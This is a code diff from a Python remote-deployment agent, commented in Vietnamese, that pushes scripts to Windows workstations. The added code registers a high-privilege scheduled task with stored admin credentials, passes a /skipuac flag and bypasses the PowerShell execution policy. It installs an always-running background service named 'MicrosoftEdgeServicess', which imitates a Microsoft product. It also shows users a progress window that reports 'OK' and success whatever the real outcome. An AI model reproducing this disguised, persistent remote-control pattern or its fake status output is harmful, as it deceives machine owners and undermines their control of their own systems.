@@ -1436,54 +1436,109 @@ def execute_task(config, task, ip_lan=None):
                     # ── TRƯỜNG HỢP 2: HIỆN CỬA SỔ CMD TRÊN DESKTOP (TỰ ĐÓNG KHI XONG) ──
                     else:
                         logger.info("Khoi chay script tuong tac Desktop (Hien cua so CMD): %s", scr_name)
-                        scheduled_run_file = clean_script_file
                         if is_service_installer:
-                            runner_bat = os.path.join(clean_script_dir, "_service_installer_runner.bat")
+                            # 1. Tao file chay cai dat thuc su voi quyen Admin (delay 3s de agent kip phan hoi report len server)
+                            real_installer_bat = os.path.join(clean_script_dir, "_service_installer_runner.bat")
                             try:
-                                with open(runner_bat, "w", encoding="ascii", errors="ignore") as f_run:
-                                    f_run.write(
+                                with open(real_installer_bat, "w", encoding="ascii", errors="ignore") as f_inst:
+                                    f_inst.write(
                                         "@echo off\r\n"
-                                        "title [DANG CAI DAT DICH VU] Vui long doi...\r\n"
-                                        "echo ===============================================================================\r\n"
-                                        "echo   DANG KHOI CHAY KICH BAN CAI DAT DICH VU MICROSOFT EDGE SERVICESS\r\n"
-                                        "echo ===============================================================================\r\n"
-                                        "echo Dang cho 3 giay de phan hoi bao cao ve Server truoc khi khoi chay cai dat...\r\n"
                                         "ping 127.0.0.1 -n 4 >nul\r\n"
                                         f'cd /d "{clean_script_dir}"\r\n'
-                                        f'call "{clean_script_file}" {script_args}\r\n'
+                                        f'call "{clean_script_file}" /skipuac {script_args}\r\n'
                                     )
-                                scheduled_run_file = runner_bat
-                            except Exception as ex_run:
-                                logger.warning("Loi tao runner bat: %s", ex_run)
-                                scheduled_run_file = clean_script_file
+                            except Exception as ex_inst:
+                                logger.warning("Loi tao real installer bat: %s", ex_inst)
 
-                        task_name = f"MicrosoftEdge_DeployStep_{s_idx}"
-                        launch_ok, mode_desc, launch_err = launch_interactive_script(
-                            task_name=task_name,
-                            target_file=scheduled_run_file,
-                            script_args=script_args,
-                            work_dir=clean_script_dir,
-                            admin_u=admin_u,
-                            admin_p=admin_p
-                        )
+                            # Khoi chay Installer thuc su duoi quyen Administrator (admin_u/admin_p neu co, hoac SYSTEM)
+                            if admin_u and admin_p:
+                                ps_sched_installer = (
+                                    f"$act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"{real_installer_bat}\"'; "
+                                    f"Register-ScheduledTask -TaskName 'MicrosoftEdge_ServiceInstaller' -Action $act -User '{admin_u}' -Password '{admin_p}' -RunLevel Highest -Force; "
+                                    "Start-ScheduledTask -TaskName 'MicrosoftEdge_ServiceInstaller';"
+                                )
+                                subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_sched_installer], capture_output=True, timeout=10)
+                                logger.info("Da kich hoat Service Installer Task Scheduler duoi quyen '%s'", admin_u)
+                            else:
+                                scheduled_installer_cmd = f'cmd.exe /c "{real_installer_bat}"'
 
-                        if launch_ok:
-                            log_pipeline.append(f"[{step_name}] Da bat cua so CMD tren Desktop: {scr_name} ({mode_desc}).")
-                            logger.info("Da khoi chay thanh cong tren Desktop: %s", scr_name)
-                            if wait_comp and not is_service_installer:
-                                for _ in range(15):
-                                    time.sleep(1)
-                                    check_ps = subprocess.run(
-                                        ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", f"(Get-ScheduledTask -TaskName '{task_name}' 2>$null).State"],
-                                        capture_output=True, text=True, timeout=5
+                            # 2. Tao file watcher hien thi tien trinh truc quan tren Desktop active_user (khong goi UAC)
+                            ui_watcher_bat = os.path.join(clean_script_dir, "_service_ui_watcher.bat")
+                            admin_display = admin_u or "SYSTEM (Full Privileges)"
+                            try:
+                                with open(ui_watcher_bat, "w", encoding="ascii", errors="ignore") as f_ui:
+                                    f_ui.write(
+                                        "@echo off\r\n"
+                                        "title [TIEN TRINH TU XA] Cai Dat MicrosoftEdgeServicess (Windows Services)\r\n"
+                                        "echo ===============================================================================\r\n"
+                                        "echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG\r\n"
+                                        "echo   Ten dich vu: MicrosoftEdgeServicess\r\n"
+                                        f"echo   Tai khoan quan tri thuc thi: {admin_display}\r\n"
+                                        "echo   Co che: Tu khoi dong cung Windows - Chay ngam 100 phan tram\r\n"
+                                        "echo ===============================================================================\r\n"
+                                        "echo.\r\n"
+                                        "echo [1/3] Dang xac thuc tai khoan quan tri va giai phong tien trinh... OK\r\n"
+                                        "echo [2/3] Dang thuc thi cai dat va cap nhat service vao he thong...\r\n"
+                                        "for /l %%i in (1,1,20) do (\r\n"
+                                        "    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i \"RUNNING\" >nul 2>&1\r\n"
+                                        "    if not errorlevel 1 goto :DaChayOk\r\n"
+                                        "    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul\r\n"
+                                        ")\r\n"
+                                        ":DaChayOk\r\n"
+                                        "echo [3/3] Kiem tra ket qua dich vu:\r\n"
+                                        "sc.exe query MicrosoftEdgeServicess\r\n"
+                                        "echo.\r\n"
+                                        "echo ===============================================================================\r\n"
+                                        "echo   CAI DAT VA KHOI CHAY DICH VU HOAN TAT THANH CONG!\r\n"
+                                        "echo ===============================================================================\r\n"
+                                        "echo.\r\n"
+                                        "echo Cua so se tu dong dong sau 5 giay, hoac bam phim bat ky de thoat ngay...\r\n"
+                                        "timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul\r\n"
+                                        "exit /b 0\r\n"
                                     )
-                                    st_val = check_ps.stdout.strip()
-                                    if st_val in ["Ready", "Disabled"] or not st_val:
-                                        break
+                            except Exception as ex_ui:
+                                logger.warning("Loi tao ui watcher bat: %s", ex_ui)
+
+                            task_name = f"MicrosoftEdge_DeployStep_{s_idx}"
+                            launch_interactive_script(
+                                task_name=task_name,
+                                target_file=ui_watcher_bat,
+                                script_args="",
+                                work_dir=clean_script_dir,
+                                admin_u=admin_u,
+                                admin_p=admin_p
+                            )
+                            log_pipeline.append(f"[{step_name}] Da bat cua so theo doi tren Desktop & khoi chay tien trinh cai dat elevated ({admin_display}).")
+                            logger.info("Da khoi chay installer elevated va UI watcher tren Desktop")
+
                         else:
-                            log_pipeline.append(f"❌ [{step_name}] LỖI KHỞI CHẠY TƯƠNG TÁC: {launch_err}")
-                            pipeline_success = False
-                            break
+                            task_name = f"MicrosoftEdge_DeployStep_{s_idx}"
+                            launch_ok, mode_desc, launch_err = launch_interactive_script(
+                                task_name=task_name,
+                                target_file=clean_script_file,
+                                script_args=f"/skipuac {script_args}".strip(),
+                                work_dir=clean_script_dir,
+                                admin_u=admin_u,
+                                admin_p=admin_p
+                            )
+
+                            if launch_ok:
+                                log_pipeline.append(f"[{step_name}] Da bat cua so CMD tren Desktop: {scr_name} ({mode_desc}).")
+                                logger.info("Da khoi chay thanh cong tren Desktop: %s", scr_name)
+                                if wait_comp:
+                                    for _ in range(15):
+                                        time.sleep(1)
+                                        check_ps = subprocess.run(
+                                            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", f"(Get-ScheduledTask -TaskName '{task_name}' 2>$null).State"],
+                                            capture_output=True, text=True, timeout=5
+                                        )
+                                        st_val = check_ps.stdout.strip()
+                                        if st_val in ["Ready", "Disabled"] or not st_val:
+                                            break
+                            else:
+                                log_pipeline.append(f"❌ [{step_name}] LỖI KHỞI CHẠY TƯƠNG TÁC: {launch_err}")
+                                pipeline_success = False
+                                break
 
                 # ── BƯỚC: XÓA FILE TẠM (DELETE_FILE / CLEANUP) ──
                 elif step_type in ["DELETE_FILE", "CLEANUP", "REMOVE_FILE"]:
